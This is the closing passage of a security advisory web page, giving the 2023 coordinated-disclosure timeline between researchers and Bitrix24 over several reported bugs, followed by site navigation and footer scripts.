<li>2023-03-24 Got reply from <a href="/cdn-cgi/l/email-protection#afc6c1c9c0ef9ecc82cdc6dbddc6d781ddda"><span class="__cf_email__" data-cfemail="f69f989099b6c795db949f82849f8ed88483">[email&#160;protected]</span></a>, they asked us to email to <a href="/cdn-cgi/l/email-protection#573e39313817353e23253e2f7934383a"><span class="__cf_email__" data-cfemail="771e19111837151e03051e0f5914181a">[email&#160;protected]</span></a> or use the form at <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a> with regards to the bug reports</li>
<li>2023-03-29 Emailed to [redacted], [redacted] &amp; [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform]</li>
<li>2023-03-30 [redacted] replied to us</li>
<li>2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform]</li>
<li>2023-03-31 Emailed back to [redacted] that we are unable to do so because it&rsquo;s a private program in that [USA bug bounty platform]</li>
<li>2023-03-31 [redacted] emailed back with the invite</li>
<li>2023-03-31 Submitted the reports via that [USA bug bounty platform]</li>
<li>2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements]</li>
<li>2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us</li>
<li>2023-04-04 We submitted the final 2 reports</li>
<li>2023-06-21 [redacted] emailed us &ldquo;Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.&rdquo;</li>
<li>2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date.</li>
<li>2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023</li>
<li>2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023</li>
<li>2023-09-22 [redacted] accepted the date</li>
<li>2023-11-01 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-1715/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-1715 &amp; CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-1718/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
